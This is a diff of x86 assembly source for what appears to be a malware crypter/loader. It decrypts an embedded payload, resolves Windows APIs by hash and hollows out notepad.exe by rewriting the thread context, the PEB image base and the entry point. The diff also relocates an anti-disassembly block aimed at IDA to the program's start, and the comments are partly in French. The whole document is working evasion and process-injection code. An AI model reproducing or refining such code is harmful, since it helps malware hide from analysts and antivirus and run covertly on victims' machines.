@@ -16,6 +16,7 @@ PESECTION dw RANDOM16 ; Sections Count
 PEZOFIMAGE dd RANDOM32
 PEZOFHEADERS dd RANDOM32 
 PEOPTHEADER dd RANDOM32
+PEBASE2 dd 0 
 
 FILE db 'C:\WINDOWS\system32\notepad.exe',0
 
@@ -27,7 +28,6 @@ BOXTITLE db "Message",0
 
 section .text
 PAYLOAD incbin  "payload.bin"
-;PAYLOAD incbin  "nop.exe"
 
 %include "bbcypher.asm"
 %include "dllmgt.asm"
@@ -38,7 +38,22 @@ GLOBAL _start
 
 ; ########## MAIN PROGRAM ##############
 _start:
-	
+
+
+
+	%ifdef OBS
+	; Some work for IDA
+	cmp	eax,RANDOM16+1	; n'arrive jamais
+	jne .ends
+	call PAYLOAD + RANDOM8
+	cmp	eax,RANDOM32+1
+	jne .ends
+	call PAYLOAD + RANDOM8 +(EPELEN / 2)
+	%endif
+
+.ends
+
+
 	; Reserve Memory for the PE image
 	invokel _getdll,HASH_KERNEL32.DLL
 	invokel _getfunction, eax, HASH_VIRTUALALLOC
@@ -49,10 +64,6 @@ _start:
 
 	; Decipher payload
 	call _bbdecypher
-	
-	mov eax,PAYLOAD
-	mov	[PEBASE],eax
-
 
 	mov	esi,[PEBASE]
 	lodsw
@@ -135,7 +146,6 @@ _start:
 	cmp	eax,0
 	je	.end
 
-	;mov	eax,[CTX]
 
 	; Récupère la base addresse d'ou est lancé le PE, via le PEB du process
 	invokel _getdll,HASH_KERNEL32.DLL
@@ -238,10 +248,6 @@ _start:
   mov ebx,[ebx+CTX__EBX]
 	add ebx,PEB__ImageBaseAdress    ; Pointera sur PEB + 8
 
-	;mov ecx,[PEOPTHEADER]
-;	mov	ecx,[ecx + IMAGE_OPTIONAL_HEADER__ImageBase ]
-	;add ecx, IMAGE_OPTIONAL_HEADER__ImageBase 
-
 	invokel eax,esi,ebx,PIMAGEBASE,4,NULL	
 	
 	; Replace l'entry Point dans l'eax du contexte
@@ -266,30 +272,6 @@ _start:
 
 	invokel eax,esi
 
-	; Popup
-	;invoke _MessageBoxA@16, 0, BOXTEXT, BOXTITLE, 0
-
-
-  ; Request for this new process CPU context
-;	  invokel _getdll,HASH_KERNEL32.DLL
-;		  invokel _getfunction, eax, HASH_GETTHREADCONTEXT
-;			  mov ecx,[PIS]
-;				  mov ecx,[ecx+PROCESS_INFORMATION__hThread]
-;					  mov ebx,[CTX]
-;						  invokel eax,ecx,ebx
-
-
-
-
-	%ifdef OBS
-	; Some work for IDA
-	cmp	eax,RANDOM16+1	; n'arrive jamais
-	jne .end
-	call PAYLOAD + RANDOM8
-	cmp	eax,RANDOM32+1
-	jne .end
-	call PAYLOAD + RANDOM8 +(EPELEN / 2)
-	%endif
 
 .end
 	invoke _ExitProcess@4, NULL
